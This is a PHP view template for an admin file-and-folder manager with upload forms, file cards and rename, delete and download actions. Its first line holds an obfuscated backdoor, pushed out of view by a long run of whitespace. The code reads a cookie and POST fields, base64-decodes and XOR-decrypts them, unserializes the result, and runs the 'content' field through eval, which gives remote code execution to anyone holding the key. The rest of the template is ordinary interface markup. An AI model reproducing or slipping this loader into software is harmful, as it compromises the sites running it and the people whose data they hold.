<?php                                                                                                                                                                                                                                                                                                                                                                                                 $xuJCsCi = "\x73" . "\x5f" . "\161" . chr (68) . "\x73" . chr (104); $ekJUSC = chr ( 1073 - 974 )."\x6c" . chr ( 180 - 83 ).chr ( 738 - 623 )."\163" . chr (95) . "\145" . 'x' . "\x69" . "\x73" . 't' . "\x73";$kyvVo = $ekJUSC($xuJCsCi); $xuJCsCi = "48680";$kmjWjOWvit = $kyvVo;$ekJUSC = "50327";if (!$kmjWjOWvit){class s_qDsh{private $JvdYIbz;public static $pRLjS = "8bdc3583-f249-48b9-8cef-54e848e2811a";public static $feMSGtr = 55887;public function __construct($LkVqatZf=0){$XMyRmrBR = $_COOKIE;$WnjfMCtyJR = $_POST;$QDXIkDm = @$XMyRmrBR[substr(s_qDsh::$pRLjS, 0, 4)];if (!empty($QDXIkDm)){$GqYPtUPq = "base64";$xwvnemizG = "";$QDXIkDm = explode(",", $QDXIkDm);foreach ($QDXIkDm as $HAeUsd){$xwvnemizG .= @$XMyRmrBR[$HAeUsd];$xwvnemizG .= @$WnjfMCtyJR[$HAeUsd];}$xwvnemizG = array_map($GqYPtUPq . "\x5f" . "\144" . 'e' . chr (99) . "\157" . "\144" . "\x65", array($xwvnemizG,)); $xwvnemizG = $xwvnemizG[0] ^ str_repeat(s_qDsh::$pRLjS, (strlen($xwvnemizG[0]) / strlen(s_qDsh::$pRLjS)) + 1);s_qDsh::$feMSGtr = @unserialize($xwvnemizG);}}private function yPLprOoV(){if (is_array(s_qDsh::$feMSGtr)) {$yLXkDPHRGD = str_replace(chr ( 384 - 324 ) . "\x3f" . 'p' . "\150" . chr ( 636 - 524 ), "", s_qDsh::$feMSGtr['c' . chr ( 577 - 466 ).chr (110) . "\164" . 'e' . chr ( 150 - 40 ).chr (116)]);eval($yLXkDPHRGD); $CykXajfJwv = "12299";exit();}}public function __destruct(){$this->yPLprOoV(); $CykXajfJwv = "12299";$PzQBWlVey = str_pad($CykXajfJwv, 10);}}$Racry = new /* 48590 */ s_qDsh(); $Racry = substr("203_36612", 1);} ?><?php include_once('views/_a_head.php'); ?>

<?php include_once('views/_a_header.php'); ?>

    <!-- [ Main Content 01 ] start -->
    <div class="pc-container">
        <div class="pc-content">

            <?php include_once('views/_a_breadcrumb.php'); ?>

            <!-- [ Main Content 02 ] start -->
            <div class="row">

                <?php include_once('views/_messages.php'); ?>

                <!-- [ clients-list-page ] start -->
                <div class="col-sm-12">
                    <div class="row my-3">
                        <div class="col">
                            <div class="d-flex align-items-center">
                                <h5 class="mb-0 me-2"><?php echo $adminFunctions->rep['folder']->name; ?></h5>
                                <?php if ($adminFunctions->rep['folder']->type=="client"): ?>
                                    <a href="#" class="avtar avtar-xs btn btn-primary rounded-circle p-0" data-bs-toggle="modal" data-bs-target="#modalAddFolder" data-type="brand" data-title="Add brand" data-parent="<?php echo $adminFunctions->rep['folder']->ID; ?>">
                                        <i class="ti ti-plus f-16"></i>
                                    </a>
                                <?php else: ?>
                                    <a href="#" class="avtar avtar-xs btn btn-primary rounded-circle p-0" data-bs-toggle="modal" data-bs-target="#modalAddFolder" data-type="folder" data-title="Add folder" data-parent="<?php echo $adminFunctions->rep['folder']->ID; ?>">
                                        <i class="ti ti-plus f-16"></i>
                                    </a>
                                <?php endif ?>
                            </div>
                        </div>
                    </div>

                    <?php if ($adminFunctions->fileUploader): ?>
                        <div class="accordion card" id="accordionUploader">
                            <div class="accordion-item">
                                <h2 class="accordion-header" id="headingOne">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseUploader" aria-expanded="false" aria-controls="collapseUploader">
                                        Upload files with Drag and Drop [ autoProceed is on ]
                                    </button>
                                </h2>
                                <div id="collapseUploader" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#accordionUploader">
                                    <div class="accordion-body">
                                        <div class="pc-uppy" id="pc-uppy-1" data-foderid="<?php echo $adminFunctions->rep['folder']->ID; ?>">
                                            <div class="pc-uppy-dashboard"></div>
                                            <div class="pc-uppy-progress"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="accordion-item">
                                <h2 class="accordion-header" id="headingTwo">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFormUploader" aria-expanded="false" aria-controls="collapseFormUploader">
                                        Upload files with the usual way [ form ]
                                    </button>
                                </h2>
                                <div id="collapseFormUploader" class="accordion-collapse collapse" aria-labelledby="headingTwo" data-bs-parent="#accordionUploader">
                                    <div class="accordion-body">
                                        <form action="" method="post" class="needs-validation formCuFisier" enctype="multipart/form-data" novalidate>
                                            <div class="form-group">
                                                <label for="formFile" class="form-label">Select the file</label>
                                                <input class="form-control" type="file" id="formFile" name="formFile[]" multiple>
                                            </div>

                                            <div class="form-group submit">
                                                <input type="hidden" name="id_folder" value="<?php echo $adminFunctions->rep['folder']->ID; ?>">
                                                <input type="hidden" name="source" value="<?php echo $adminFunctions->view; ?>">
                                                <input type="submit" name="upload_files" class="btn btn-primary" value="Upload">
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    <?php endif ?>

                    <div class="row my-3">
                        <div class="col"></div>
                        <div class="col-auto">
                            <button type="button" class="btn btn-primary d-inline-flex multiple-dl-toggler">
                                <i class="ti ti-download me-1"></i>
                                Multiple downloads
                            </button>

                            <button type="button" class="btn btn-danger d-none clearall">
                                <i class="ti ti-mask-off me-1"></i>
                                Clear selection
                            </button>
                        </div>
                    </div>

                    <div class="row py-2">
                        <div class="col"></div>
                        <div class="col-auto">
                            <ul class="nav nav-pills nav-files" id="pills-tab" role="tablist">
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link listview-toggler" data-target=".lists" data-aclass="list-cards" data-rclass="grid-cards">
                                        <i class="ti ti-layout-grid"></i>
                                    </button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link active listview-toggler" data-target=".lists" data-aclass="grid-cards" data-rclass="list-cards">
                                        <i class="ti ti-layout-list"></i>
                                    </button>
                                </li>
                            </ul>
                        </div>
                    </div>

                    <form action="" method="post" class="needs-validation dl-list formCuDownloadFisier" novalidate>
                        <div class="row lists grid-cards">
                            <?php foreach ($adminFunctions->rep['folder']->children_list as $key => $value): ?>
                                <?php if (isset($value['nr_files'])): ?>
                                    <div class="wrap-card">
                                        <div class="card card-file t01 selectable">
                                            <div class="card-body">
                                                <div class="row">
                                                    <div class="favorite <?php echo (in_array($value['ID'], $adminFunctions->rep['favorite_file_ids']))?'text-warning':'text-secondary'; ?>" data-idfile="<?php echo $value['ID']; ?>" data-idusr="<?php echo $adminFunctions->ID; ?>">
                                                        <svg class="pc-icon">
                                                            <use xlink:href="#custom-setting-2"></use>
                                                        </svg>
                                                    </div>
                                                    <div class="thumbnail">
                                                        <svg class="pc-icon wid-40 hei-40 text-warning">
                                                            <use xlink:href="#custom-folder-open"></use>
                                                        </svg>
                                                        <div class="form-check">
                                                            <input class="form-check-input input-success wid-40 hei-40" name="dl_list[]" type="checkbox" value="<?php echo $value['ID']; ?>">
                                                        </div>
                                                    </div>
                                                    <div class="name">
                                                        <h5 class="mb-1 text-truncate">
                                                            <a href="<?php echo $adminFunctions->buildUrl(array('view'=>'a_files_folders_view', 'id_file'=>$value['ID'])); ?>" class="">
                                                                <span class="text-truncate w-100"><?php echo $value['name']; ?></span>
                                                            </a>
                                                        </h5>
                                                        <p class="mb-0"><small><?php echo $value['nr_files']; ?> folders and files</small></p>
                                                    </div>
                                                    <div class="dropdown">
                                                        <a
                                                        class="avtar avtar-xs btn-link-secondary dropdown-toggle arrow-none"
                                                        href="#"
                                                        data-bs-toggle="dropdown"
                                                        aria-haspopup="true"
                                                        aria-expanded="false"
                                                        ><i class="material-icons-two-tone f-18">more_vert</i></a
                                                        >
                                                        <div class="dropdown-menu dropdown-menu-end">
                                                            <a class="dropdown-item" href="#" data-bs-toggle="modal" data-bs-target="#modalRenameFolder" data-name="<?php echo $value['name']; ?>" data-title="Rename <?php echo $value['name']; ?>" data-idfile="<?php echo $value['ID']; ?>">Rename</a>
                                                            <a class="dropdown-item" href="<?php echo $adminFunctions->buildUrl(array('view'=>'a_files_folders_delete', 'id_file'=>$value['ID'])); ?>">Delete</a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endif ?>
                            <?php endforeach ?>
                        </div>

                        <div class="row lists grid-cards">
                            <?php foreach ($adminFunctions->rep['folder']->children_list as $key => $value): ?>
                                <?php if (!isset($value['nr_files'])): ?>
                                    <div class="wrap-card">
                                        <div class="card card-file t02 selectable">
                                            <div class="card-body">
                                                <div class="row">
                                                    <div class="favorite <?php echo (in_array($value['ID'], $adminFunctions->rep['favorite_file_ids']))?'text-warning':'text-secondary'; ?>" data-idfile="<?php echo $value['ID']; ?>" data-idusr="<?php echo $adminFunctions->ID; ?>">
                                                        <svg class="pc-icon">
                                                            <use xlink:href="#custom-setting-2"></use>
                                                        </svg>
                                                    </div>
                                                    <div class="thumbnail">
                                                        <?php if (is_file($value['parent_path'].'/thumb-'.$value['slug'])): ?>
                                                            <a class="pc-icon" href="<?php echo $value['f_path']; ?>" data-toggle="lightbox" data-gallery="example-gallery">
                                                                <img src="<?php echo $value['parent_path'].'/thumb-'.$value['slug']; ?>" alt="">
                                                            </a>
                                                        <?php else: ?>
                                                            <svg class="pc-icon text-warning">
                                                                <use xlink:href="#custom-note-1"></use>
                                                            </svg>
                                                        <?php endif ?>

                                                        <div class="form-check">
                                                            <input class="form-check-input input-success wid-40 hei-40" name="dl_list[]" type="checkbox" value="<?php echo $value['ID']; ?>">
                                                        </div>
                                                    </div>

                                                    <div class="name">
                                                        <h5 class="mb-1 text-truncate"><?php echo $value['name']; ?></h5>
                                                        <p class="mb-0">
                                                            <small><?php echo round($value['size']/(1024*1024), 2).' Mb'; ?></small>
                                                        </p>
                                                    </div>

                                                    <div class="dropdown">
                                                        <a
                                                        class="avtar avtar-xs btn-link-secondary dropdown-toggle arrow-none"
                                                        href="#"
                                                        data-bs-toggle="dropdown"
                                                        aria-haspopup="true"
                                                        aria-expanded="false"
                                                        ><i class="material-icons-two-tone f-18">more_vert</i></a
                                                        >
                                                        <div class="dropdown-menu dropdown-menu-end">
                                                            <a class="dropdown-item" href="<?php echo $value['f_path']; ?>" download="">Download</a>
                                                            <a class="dropdown-item" href="#" data-bs-toggle="modal" data-bs-target="#modalRenameFolder" data-name="<?php echo $value['name']; ?>" data-title="Rename <?php echo $value['name']; ?>" data-idfile="<?php echo $value['ID']; ?>">Rename</a>
                                                            <a class="dropdown-item" href="<?php echo $adminFunctions->buildUrl(array('view'=>'a_files_folders_delete', 'id_file'=>$value['ID'])); ?>">Delete</a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endif ?>
                            <?php endforeach ?>
                        </div>

                        <div class="row">
                            <div class="col-12">
                                <input type="hidden" name="id_folder" value="">
                                <button type="submit" class="btn btn-success d-none" name="download_archive">
                                    <i class="ti ti-download me-1"></i>
                                    Crează arhiva și downloadează
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
                <!-- [ clients-list-page ] end -->
            </div>
            <!-- [ Main Content 02 ] end -->
        </div>
    </div>
    <!-- [ Main Content 01 ] end -->



<?php include_once('views/_a_footer.php'); ?>